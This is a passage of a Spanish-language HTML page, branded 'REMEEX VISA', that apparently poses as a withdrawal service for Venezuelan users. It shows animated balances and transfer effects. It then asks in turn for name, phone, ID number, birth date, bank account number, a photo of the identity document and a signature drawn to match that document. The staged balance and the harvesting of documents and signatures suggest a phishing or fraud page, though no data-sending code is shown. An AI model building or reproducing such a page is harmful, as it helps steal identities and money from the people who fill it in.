      margin: 1.5rem auto;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .bank-logo {
      max-height: 50px;
      max-width: 160px;
      filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
      transition: var(--transition);
    }
    
    .bank-logo:hover {
      transform: scale(1.05);
      filter: drop-shadow(0 6px 8px rgba(0, 0, 0, 0.2));
    }
    
    /* Mensaje de advertencia con icono */
    .warning-message {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      margin-top: 1rem;
      padding: 0.75rem;
      background-color: rgba(245, 158, 11, 0.1);
      border-radius: var(--border-radius-sm);
      border-left: 3px solid var(--warning);
    }
    
    .warning-icon {
      color: var(--warning);
      font-size: 1rem;
    }
    
    .warning-text {
      font-size: 0.85rem;
      color: var(--text-secondary);
      text-align: left;
    }
    
    /* Iconos de éxito/error */
    .result-icon {
      width: 80px;
      height: 80px;
      margin: 1.5rem auto;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }
    
    .result-icon.success {
      background-color: rgba(57, 255, 20, 0.1);
    }
    
    .result-icon.error {
      background-color: rgba(239, 68, 68, 0.1);
    }
    
    .result-icon i {
      font-size: 2.5rem;
      z-index: 2;
    }
    
    .result-icon.success i {
      color: var(--neon-green);
      text-shadow: 0 0 5px var(--neon-green-glow), 0 0 10px var(--neon-green-glow);
    }
    
    .result-icon.error i {
      color: var(--danger);
    }
    
    .result-icon::after {
      content: '';
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: transparent;
      border: 2px solid currentColor;
      opacity: 0;
      transform: scale(0.8);
      animation: ripple 1.5s ease-out infinite;
    }
    
    .result-icon.success::after {
      border-color: var(--neon-green);
      box-shadow: 0 0 15px var(--neon-green-glow);
    }
    
    .result-icon.error::after {
      border-color: var(--danger);
    }
    
    @keyframes ripple {
      from {
        opacity: 1;
        transform: scale(0.8);
      }
      to {
        opacity: 0;
        transform: scale(1.5);
      }
    }/* Contador regresivo */
    .countdown-container {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: var(--text-secondary);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }
    
    .countdown-number {
      display: inline-block;
      background: var(--primary);
      color: white;
      font-weight: 600;
      width: 28px;
      height: 28px;
      line-height: 28px;
      text-align: center;
      border-radius: 50%;
    }

    /* Overlay y Modal (estilos heredados, mantienen compatibilidad) */
    .overlay-legacy {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      padding: 1rem;
    }
    .overlay-legacy.active {
      display: flex;
      backdrop-filter: blur(5px);
    }
    .modal-legacy {
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 1.5rem;
      width: 90%;
      max-width: 420px;
      box-shadow: var(--shadow-lg);
      text-align: center;
      position: relative;
      backdrop-filter: blur(8px);
      border: 2px solid #fff;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
    }
    .modal-legacy h3 {
      font-size: 1.2rem;
      margin-bottom: 0.5rem;
      color: var(--primary);
    }
    .modal-legacy p {
      font-size: 0.95rem;
      color: var(--text-secondary);
      margin-bottom: 1rem;
      line-height: 1.4;
    }

    /* Cuenta regresiva */
    .countdown {
      font-size: 0.9rem;
      color: var(--text-secondary);
      margin-top: 0.5rem;
    }

    /* Resumen final (Planilla de Retiro) - MEJORADO */
    .data-summary {
      margin-top: 1rem;
      border: 1px solid rgba(0, 0, 0, 0.1);
      border-radius: var(--border-radius-sm);
      padding: 1rem 1.25rem;
      background: #fff;
      color: var(--text-primary);
      margin-bottom: 1.25rem;
      box-shadow: var(--shadow-sm);
      transition: all 0.3s ease;
    }
    
    .data-summary:hover {
      box-shadow: var(--shadow);
      transform: translateY(-2px);
    }
    
    .data-summary h3 {
      font-size: 1.1rem;
      font-weight: 600;
      margin-bottom: 0.75rem;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 0.5rem;
      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
      padding-bottom: 0.5rem;
    }
    
    .data-item {
      margin-bottom: 0.5rem;
      font-size: 0.95rem;
      line-height: 1.5;
    }
    
    .data-item strong {
      color: var(--primary-dark);
      min-width: 180px;
      display: inline-block;
      margin-right: 0.5rem;
    }
    
    .data-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 1.5rem;
    }

    /* Firma análisis */
    .firma-analyzing {
      display: flex;
      align-items: center;
      justify-content: flex-end;
      gap: 0.5rem;
      color: var(--text-secondary);
      font-size: 0.85rem;
      margin-top: 0.5rem;
    }

    /* Barra de progreso para overlay final */
    .overlay-progress-bar {
      height: 10px;
      background-color: #e2e8f0;
      border-radius: var(--border-radius);
      margin: 1rem 0;
      overflow: hidden;
      position: relative;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
    }
    .overlay-progress-fill {
      height: 100%;
      background: var(--success);
      width: 0%; /* Inicia en 0 */
      transition: width 0.3s linear;
      border-radius: var(--border-radius);
    }/* Mini Balance Card Styles */
    .mini-balance-card {
      background: linear-gradient(150deg, #1a237e 0%, #0d47a1 100%);
      color: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius);
      padding: 1rem;
      margin: 1rem auto;
      width: 90%;
      max-width: 300px;
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
      z-index: 2;
      font-family: 'Inter', sans-serif;
      transition: var(--transition);
    }

    .mini-balance-card::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
      background-size: 20px 20px;
      z-index: 0;
      opacity: 0.3;
    }

    .mini-balance-label {
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.8);
      margin-bottom: 0.5rem;
    }

    .mini-balance-amount {
      font-size: 1.8rem;
      font-weight: 700;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      background: linear-gradient(to right, #ffffff, #e0e0e0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-fill-color: transparent;
      position: relative;
      transition: transform 0.2s ease-out;
    }

    /* Animation for balance flash on restoration */
    @keyframes balance-flash-animation {
      0% {
        text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      }
      50% {
        text-shadow: 0 0 20px rgba(0, 230, 118, 0.8), 0 0 30px rgba(0, 230, 118, 0.6);
        color: rgba(0, 230, 118, 1);
        -webkit-text-fill-color: rgba(0, 230, 118, 1);
      }
      100% {
        text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      }
    }

    /* NUEVOS ESTILOS PARA TARJETAS DE TRANSFERENCIA */
    .cards-container {
      display: flex;
      flex-direction: column; /* Cambiado para siempre mostrar una encima de otra */
      justify-content: center;
      align-items: center;
      margin: 1.5rem 0;
      gap: 0.75rem;
      position: relative;
    }

    .transfer-card {
      width: 90%; /* Aumentado para mejor visibilidad */
      border-radius: var(--border-radius);
      padding: 0.75rem;
      display: flex;
      flex-direction: column;
      box-shadow: var(--shadow);
      transition: var(--transition);
      min-height: 120px;
      min-width: 140px; /* Ancho mínimo para evitar colapso */
    }

    /* Estilo modificado para la tarjeta Visa más clara */
    .visa-card {
      background: linear-gradient(135deg, var(--visa-grad-start), var(--visa-grad-end));
      color: rgba(255, 255, 255, 0.95);
      position: relative;
      overflow: hidden;
    }

    .visa-card::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
      background-size: 20px 20px;
      z-index: 0;
      opacity: 0.3;
    }

    .bank-card {
      background: linear-gradient(135deg, #f7f9fc 0%, #e8eef5 100%);
      color: #0f172a;
      border: 1px solid rgba(0, 0, 0, 0.1);
      transform: scale(0.9);
      opacity: 0;
      transition: all 0.6s ease-out;
    }

    .bank-card.active {
      transform: scale(1);
      opacity: 1;
    }/* Nuevo contenedor para el logo del banco cuando la tarjeta está oculta */
    .bank-logo-overlay {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 90%; /* Aumentado para coincidir con el ancho de las tarjetas */
      min-width: 140px;
      min-height: 120px;
      opacity: 0;
      transition: opacity 0.5s ease;
    }

    .bank-logo-overlay.active {
      display: flex;
      opacity: 1;
    }

    .bank-logo-overlay img {
      max-width: 90%;
      max-height: 60px;
      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.2));
    }

    .bank-logo-overlay .logo-text {
      margin-top: 10px;
      font-size: 0.8rem;
      color: var(--text-secondary);
      text-align: center;
    }

    .card-header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 0.5rem;
      z-index: 1;
    }

    .card-logo {
      max-height: 30px;
      max-width: 90%;
      object-fit: contain;
    }

    .card-body {
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 1;
      flex-grow: 1;
      justify-content: center;
    }

    .card-label {
      font-size: 0.75rem;
      opacity: 0.8;
      margin-bottom: 0.25rem;
    }

    .card-amount {
      font-size: 1.4rem;
      font-weight: 700;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 100%;
    }

    /* Clase adicional para saldos con muchos dígitos */
    .card-amount.small-text {
      font-size: 1.1rem;
    }

    .visa-card .card-amount {
      /* Eliminado el efecto de glow/texto brillante */
      text-shadow: none;
      color: #ffffff;
      /* Eliminar efectos de brillante verde */
      -webkit-background-clip: initial;
      -webkit-text-fill-color: initial;
      background-clip: initial;
      text-fill-color: initial;
    }

    .bank-card .card-amount {
      color: var(--primary-dark);
    }

    /* Transferencia y partículas */
    .transfer-animation {
      position: relative;
      width: 4px; /* Cambiado para modo vertical */
      height: 20%; /* Cambiado para modo vertical */
      z-index: 2;
      margin: 0.25rem 0; /* Espacio vertical entre tarjetas */
    }

    .transfer-line {
      position: absolute;
      top: 0;
      left: 50%;
      width: 2px;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.1);
      transform: translateX(-50%);
    }

    .transfer-arrow {
      position: absolute;
      top: auto;
      bottom: -4px;
      left: 50%;
      width: 0;
      height: 0;
      border-left: 6px solid transparent;
      border-right: 6px solid transparent;
      border-top: 8px solid rgba(0, 0, 0, 0.2);
      transform: translateX(-50%);
    }

    .transfer-particles-container {
      position: absolute;
      top: 0;
      bottom: 0;
      left: -20px;
      right: -20px;
      width: auto;
      overflow: hidden;
    }

    .money-particle {
      position: absolute;
      background-color: var(--neon-green);
      width: 4px;
      height: 4px;
      border-radius: 50%;
      opacity: 0.8;
      filter: drop-shadow(0 0 2px var(--neon-green-glow));
    }/* Animación para devolver dinero (reversa) */
    .transfer-animation.reverse .transfer-arrow {
      bottom: auto;
      top: -4px;
      border-top: none;
      border-bottom: 8px solid rgba(0, 0, 0, 0.2);
    }

    /* Money animation flash */
    @keyframes money-flash {
      0% {
        filter: brightness(1);
      }
      50% {
        filter: brightness(1.2);
      }
      100% {
        filter: brightness(1);
      }
    }

    .card-amount.pulsing {
      animation: money-flash 1s infinite;
    }

    /* Modal para Acceso Restringido */
    .access-modal {
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      width: 90%;
      max-width: 420px;
      box-shadow: var(--shadow-lg);
      text-align: center;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 1000;
      backdrop-filter: blur(8px);
      display: none;
    }

    .access-modal.active {
      display: block;
      animation: modalBounce 0.5s forwards;
    }

    @keyframes modalBounce {
      0% { transform: translate(-50%, -60%); opacity: 0; }
      50% { transform: translate(-50%, -48%); }
      100% { transform: translate(-50%, -50%); opacity: 1; }
    }

    .access-modal-backdrop {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      z-index: 999;
      display: none;
    }

    .access-modal-backdrop.active {
      display: block;
      animation: fadeIn 0.3s forwards;
    }

    .access-form {
      margin-top: 1.5rem;
    }

    .access-form input {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 2px solid var(--border-gray);
      border-radius: var(--border-radius);
      margin-bottom: 1rem;
      font-size: 1rem;
      transition: var(--transition);
    }

    .access-form input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.2);
      outline: none;
    }

    .access-form button {
      width: 100%;
      padding: 0.75rem;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      border-radius: var(--border-radius);
      font-weight: 600;
      cursor: pointer;
      transition: var(--transition);
    }

    .access-form button:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(26, 31, 113, 0.3);
    }

    .access-error {
      color: var(--danger);
      font-size: 0.9rem;
      margin-top: 0.5rem;
      display: none;
    }

    .access-error.active {
      display: block;
      animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
    }

    @keyframes shake {
      10%, 90% { transform: translate3d(-1px, 0, 0); }
      20%, 80% { transform: translate3d(2px, 0, 0); }
      30%, 50%, 70% { transform: translate3d(-3px, 0, 0); }
      40%, 60% { transform: translate3d(3px, 0, 0); }
    }/* Media queries para responsividad */
    @media (max-width: 768px) {
      .header {
        padding: 2rem 1rem;
      }
      .header-logo {
        width: 70%;
        max-width: 300px;
      }
      .balance-card {
        margin: -2rem 1rem 1.5rem 1rem;
      }
      .progress-bar {
        margin: 1.5rem 1rem;
      }
      .btn-container {
        width: 100%;
        justify-content: space-between;
      }
      .section-content {
        padding: 1.5rem;
      }
      
      .form-group {
        margin-bottom: 1.25rem;
      }
      
      .form-label {
        margin-bottom: 0.35rem;
        font-size: 0.9rem;
      }
      
      .form-control {
        padding: 0.75rem 1rem;
        font-size: 0.95rem;
      }
      
      .checkbox-group {
        padding: 0.75rem;
        margin-top: 1rem;
        font-size: 0.9rem;
      }
      
      h2 {
        font-size: 1.3rem;
        margin-bottom: 1.25rem;
      }
      
      .modal {
        width: 85%;
        padding: 1.25rem;
      }
      
      .modal h3 {
        font-size: 1.1rem;
      }
      
      .modal p {
        font-size: 0.9rem;
      }
      
      .data-summary {
        padding: 0.75rem 1rem;
      }
      
      .data-grid {
        grid-template-columns: 1fr;
        gap: 1rem;
      }
      
      .data-item strong {
        min-width: 150px;
      }

      .mini-balance-card {
        padding: 0.75rem;
        margin: 0.75rem auto;
      }
      
      .mini-balance-label {
        font-size: 0.75rem;
      }
      
      .mini-balance-amount {
        font-size: 1.5rem;
      }
      
      /* Mejora para mantener botones en la misma línea en dispositivos móviles */
      .btn-container2 {
        flex-direction: row;
        justify-content: space-between;
      }
      
      /* Ajuste para asegurar que Regresar esté a la izquierda y Continuar a la derecha */
      .btn-container2 .btn-back {
        order: 1;
      }
      
      .btn-container2 .btn-continue {
        order: 2;
        margin-left: auto;
      }
    }
    
    @media (max-width: 480px) {
      .header {
        padding: 1.75rem 1rem;
      }
      
      .header-logo {
        width: 65%;
        max-width: 250px;
      }
      
      .section-content {
        padding: 1.25rem;
      }
      
      .form-group {
        margin-bottom: 1rem;
      }
      
      .form-control {
        padding: 0.7rem 0.9rem;
        font-size: 0.9rem;
      }
      
      .balance-card {
        padding: 1.25rem;
        margin: -1.5rem 1rem 1.5rem 1rem;
      }
      
      .balance-amount {
        font-size: 1.8rem;
      }
      
      .dynamic-text {
        font-size: 0.65rem;
      }
      
      .spinner {
        width: 12px;
        height: 12px;
      }
      
      .spinner-inner {
        left: 2.5px;
        top: 2.5px;
        width: 7px;
        height: 7px;
      }
      
      .signature-canvas {
        height: 180px;
      }
      
      /* Evitar textos cortados en dispositivos pequeños */
      .status-banner, .dynamic-text {
        white-space: normal;
        line-height: 1.3;
      }
      
      .data-item strong {
        min-width: 120px;
        font-size: 0.85rem;
        display: block;
        margin-bottom: 0.25rem;
      }
      
      .data-summary h3 {
        font-size: 1rem;
      }
      
      /* Ajustes para formulario más compacto */
      .form-label {
        font-size: 0.85rem;
      }
      
      .btn-text {
        font-size: 0.85rem;
      }
      
      .data-item {
        font-size: 0.85rem;
      }

      .mini-balance-card {
        padding: 0.6rem;
      }
      
      .mini-balance-label {
        font-size: 0.7rem;
        margin-bottom: 0.3rem;
      }
      
      .mini-balance-amount {
        font-size: 1.2rem;
      }
    }/* Centrado de logos en overlays */
    .modal img {
      display: block;
      margin: 0.75rem auto;
      max-height: 45px;
      max-width: 80%;
    }
    
    /* Estilos para campo de monto no editable */
    .form-control[readonly] {
      background-color: #f8fafc;
      border-color: #e2e8f0;
      cursor: not-allowed;
      color: var(--primary);
      font-weight: 600;
    }
  </style>
</head>
<body>

<!-- Modal de Acceso Restringido -->
<div class="access-modal-backdrop" id="accessModalBackdrop"></div>
<div class="access-modal" id="accessModal">
  <h3>Acceso Restringido</h3>
  <p>Esta página requiere autorización. Por favor, ingresa tu código de acceso para continuar.</p>
  <div class="access-form">
    <input type="password" id="accessCode" placeholder="Ingresa tu código de acceso" autocomplete="off">
    <button id="accessSubmitBtn">Acceder</button>
  </div>
  <div class="access-error" id="accessError">
    Código incorrecto. Por favor, intenta nuevamente.
  </div>
</div>

<div class="container">
  <!-- Encabezado principal - eliminado el texto -->
  <div class="header">
    <img 
      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png"
      alt="REMEEX VISA Logo" class="header-logo"
    >
  </div>

  <!-- Nueva tarjeta de saldo disponible -->
  <div class="balance-card">
    <!-- Portal de transferencia -->
    <div class="transfer-portal"></div>
    
    <!-- Contenedor de partículas -->
    <div class="particles-container" id="particlesContainer"></div>
    
    <!-- Encabezado de la tarjeta -->
    <div class="card-header">
      <div class="logo">
        <i class="fa-brands fa-cc-visa" style="font-size: 1.5rem;"></i>
      </div>
      
      <!-- Exchange rate -->
      <div class="exchange-rate">
        <span id="exchangeRateText">Tasa: --</span>
        <i class="fas fa-exchange-alt" style="font-size: 0.8rem;"></i>
      </div>
    </div>
    
    <!-- Sección del saldo -->
    <div class="balance-section">
      <div class="balance-label" id="balanceLabel">
        Saldo disponible
        <span class="spinner" id="balanceSpinner">
          <span class="spinner-circle"></span>
          <span class="spinner-inner"></span>
        </span>
      </div>
      <div class="balance-amount" id="balanceAmount">0,00 Bs</div>
    </div>
    
    <!-- Unified dynamic text section -->
    <div class="info-section">
      <div class="dynamic-text" id="dynamicText">
        <span>Procesando transferencia</span>
        <span class="dot-loader"></span>
      </div>
    </div>
  </div><!-- Barra de progreso con texto -->
  <div class="progress-bar">
    <div class="progress-bar-fill" id="progressBarFill"></div>
    <span class="progress-text" id="progressText">Paso 2 de 5</span>
  </div>

  <!-- STEP 2: Beneficiario Receptor -->
  <div class="section-content active" id="step2">
    <h2><i class="fas fa-user"></i> Beneficiario Receptor</h2>
    <p style="margin-bottom:1rem; font-size:0.9rem; color:var(--text-secondary);">
      ¿Eres tú quien recibirás los fondos en tu cuenta o va para alguien más?<br>
      <span style="font-weight: 500; color: var(--primary);">Es importante que la información coincida con tu documento de identidad para garantizar la seguridad de la transacción y evitar rechazos.</span>
    </p><div class="form-group">
      <label class="form-label" for="fullName">Nombres y Apellidos</label>
      <input type="text" class="form-control" id="fullName" placeholder="Ej.: Juan Pérez" />
    </div>
    <div class="form-group">
      <label class="form-label" for="phonePrefix">Teléfono</label>
      <div style="display:flex; gap:0.5rem;">
        <select class="form-control" id="phonePrefix" style="max-width:150px;">
          <option value="">-- Prefijo --</option>
          <option value="0414">0414</option>
          <option value="0424">0424</option>
          <option value="0412">0412</option>
          <option value="0416">0416</option>
          <option value="0426">0426</option>
        </select>
        <input type="text" class="form-control" id="phoneNumber" placeholder="7 dígitos" maxlength="7" />
      </div>
    </div>
    <div class="form-group">
      <label class="form-label" for="docType">Tipo de Documento</label>
      <select class="form-control" id="docType">
        <option value="">-- Selecciona --</option>
        <option value="Cédula de Identidad">Cédula de Identidad</option>
        <option value="Pasaporte Vigente">Pasaporte Vigente</option>
        <option value="Licencia de Conducir">Licencia de Conducir</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label" for="nationality">Nacionalidad</label>
      <select class="form-control" id="nationality">
        <option value="">-- Selecciona --</option>
        <option value="Venezolano">Venezolano</option>
        <option value="Extranjero">Extranjero</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label" for="docNumber">Número de documento</label>
      <input type="text" class="form-control" id="docNumber" placeholder="8 a 10 dígitos" maxlength="10" />
    </div>
    <div class="form-group">
      <label class="form-label" for="birthDate">Fecha de nacimiento</label>
      <input type="date" class="form-control" id="birthDate" max="9999-12-31" />
    </div>
    <div class="form-group checkbox-group">
      <input type="checkbox" id="isAdult" />
      <label for="isAdult">Declaro que soy mayor de edad</label>
    </div>

    <div class="btn-container">
      <!-- Se eliminó el botón "Ir a Saldo" -->
      <!-- Botón Continuar centrado -->
      <div style="position: relative; width: 140px; height: 50px; margin: 0 auto;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="continueBtnStep2">
          <div class="btn-glow-content btn-glow-initial">
            Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
               viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          </div>
        </button>
      </div>
    </div>
  </div>

  <!-- STEP 3: Datos Bancarios -->
  <div class="section-content" id="step3">
    <h2><i class="fas fa-university"></i> Datos Bancarios del Beneficiario</h2>
    <p style="margin-bottom:1rem; font-size:0.9rem; color:var(--text-secondary);">
      <span id="userNameStep3">Usuario</span>, indícanos tus datos bancarios donde realizaremos el depósito:
    </p>
    <div class="form-group">
      <label class="form-label" for="bankSelect">Banco</label>
      <select class="form-control" id="bankSelect">
        <option value="">-- Selecciona un banco --</option>
      </select>
    </div>
    <div class="form-group" id="accountContainer" style="display:none;">
      <label class="form-label" for="accountNumber">Número de cuenta</label>
      <div style="display:flex; gap:0.5rem;">
        <input type="text" class="form-control" id="bankCode" style="max-width:100px;" readonly />
        <input type="text" class="form-control" id="restAccountDigits"
               placeholder="16 dígitos restantes" maxlength="16" />
      </div>
    </div>
    <div class="form-group">
      <label class="form-label" for="accountType">Tipo de cuenta</label>
      <select class="form-control" id="accountType">
        <option value="">-- Selecciona --</option>
        <option value="Ahorro (Bs)">Ahorro (Bs)</option>
        <option value="Corriente (Bs)">Corriente (Bs)</option>
        <option value="Divisa Dólares (USD)">Divisa Dólares (USD)</option>
        <option value="Divisa Euros (EUR)">Divisa Euros (EUR)</option>
      </select>
    </div><!-- Botones para Step2 <---> Step4 -->
    <div class="btn-container2">
      <!-- Botón Regresar a Step2 -->
      <div style="position: relative; width: 120px; height: 50px;" class="btn-back">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="backBtnStep3">
          <div class="btn-glow-content btn-glow-initial">
            Regresar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Regresar
            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
               viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round">
              <line x1="19" y1="12" x2="5" y2="12"></line>
              <polyline points="12 5 5 12 12 19"></polyline>
            </svg>
          </div>
        </button>
      </div>

      <!-- Botón Continuar a Step4 -->
      <div style="position: relative; width: 120px; height: 50px;" class="btn-continue">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="continueBtnStep3">
          <div class="btn-glow-content btn-glow-initial">
            Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
               viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          </div>
        </button>
      </div>
    </div>
  </div>

  <!-- STEP 4: Documento de Identidad -->
  <div class="section-content" id="step4">
    <h2><i class="fas fa-id-card"></i> Documento de Identidad</h2>
    <p style="margin-bottom:1rem; font-size:0.9rem; color:var(--text-secondary);">
      Carga tu documento de identidad para verificar tu información. Asegúrate de que sea válido y legible.
    </p>
    
    <label for="idDocument" style="display:block; margin-bottom:0.5rem; font-weight: 500; color: var(--text-secondary);">
      Seleccionar archivo (solo imágenes)
    </label>
    <input type="file" id="idDocument" accept="image/*" style="margin-bottom: 1.5rem;" />

    <div class="preview-container" id="previewContainer">
      <img id="docPreview" src="#" alt="Vista Previa" />
      <div style="margin-top: 1rem; color: var(--text-secondary); font-size: 0.95rem;">
        <strong>Requisitos:</strong>
        <ul style="padding-left: 20px; margin-top: 5px;">
          <li>Documento vigente</li>
          <li>Imagen legible</li>
          <li>Firma y datos visibles</li>
        </ul>
      </div>
    </div>

    <!-- Botones Step3 <---> 
    <div class="btn-container2">
      <!-- Botón Regresar a Step3 - SIEMPRE a la izquierda -->
      <div style="position: relative; width: 120px; height: 50px;" class="btn-back">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="backBtnStep4">
          <div class="btn-glow-content btn-glow-initial">
            Regresar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Regresar
            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
               viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round">
              <line x1="19" y1="12" x2="5" y2="12"></line>
              <polyline points="12 5 5 12 12 19"></polyline>
            </svg>
          </div>
        </button>
      </div>

      <!-- Botón Continuar - SIEMPRE a la derecha -->
      <div style="position: relative; width: 120px; height: 50px;" class="btn-continue">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="confirmDocBtn" disabled>
          <div class="btn-glow-content btn-glow-initial">
            Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
               viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownDocBtn"></div>
    </div>
  </div><!-- STEP 5: Firma Digital -->
  <div class="section-content" id="step5">
    <h2><i class="fas fa-file-signature"></i> Firma Digital</h2>
    <p style="font-size:0.93rem; line-height:1.4;">
      <span id="userNameStep5">Usuario</span>, firma como lo haces en tu documento de identidad.<br/>
      <i class="fas fa-shield-alt" style="color:var(--primary);"></i>
      Tu firma debe coincidir con la de tu documento para comprobar que eres el titular y evitar cualquier suplantación.<br/>
      <i class="fas fa-exclamation-triangle" style="color:var(--warning);"></i>
      Si no coincide, se te solicitará verificación adicional.
    </p>

    <!-- Canvas de firma -->
    <canvas class="signature-canvas" id="signatureCanvas"></canvas>

    <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
      <div style="position: relative; width: 120px; height: 50px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="clearSignatureBtn">
          <div class="btn-glow-content btn-glow-initial">
            Limpiar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Limpiar
            <i class="fas fa-eraser btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div style="position: relative; width: 120px; height: 50px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="saveSignatureBtn">
          <div class="btn-glow-content btn-glow-initial">
            Guardar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Guardar
            <i class="fas fa-save btn-glow-icon"></i>
          </div>
        </button>
      </div>
    </div>

    <!-- Botón para regresar a step4 -->
    <div style="text-align:left; margin-top:1rem;">
      <div style="position: relative; width: 120px; height: 50px;" class="btn-back">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="backBtnStep5">
          <div class="btn-glow-content btn-glow-initial">
            Regresar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Regresar
            <i class="fas fa-arrow-left btn-glow-icon"></i>
          </div>
        </button>
      </div>
    </div>
  </div>

  <!-- STEP 6: Planilla de Retiro (Resumen Final) - MEJORADO -->
  <div class="section-content" id="step6">
    <h2><i class="fas fa-file-alt"></i> Planilla de Retiro</h2>

    <p style="font-size:0.93rem; line-height:1.4; color: var(--text-secondary);">
      Selecciona el método de retiro que deseas:
    </p>

    <div class="form-group">
      <label class="form-label" for="pagoMethodSelect">Método de Retiro</label>
      <select class="form-control" id="pagoMethodSelect">
        <option value="">-- Selecciona --</option>
        <option value="Pago Móvil">Pago Móvil (hasta 100.000 Bs)</option>
        <option value="Transferencia Bancaria">Transferencia Bancaria (hasta 950.000 Bs)</option>
      </select>
    </div>

    <div class="form-group">
      <label class="form-label" for="montoRetiro">Monto a Retirar (Bs)</label>
      <input type="text" class="form-control" id="montoRetiro" placeholder="Ej.: 50.000" readonly />
    </div>
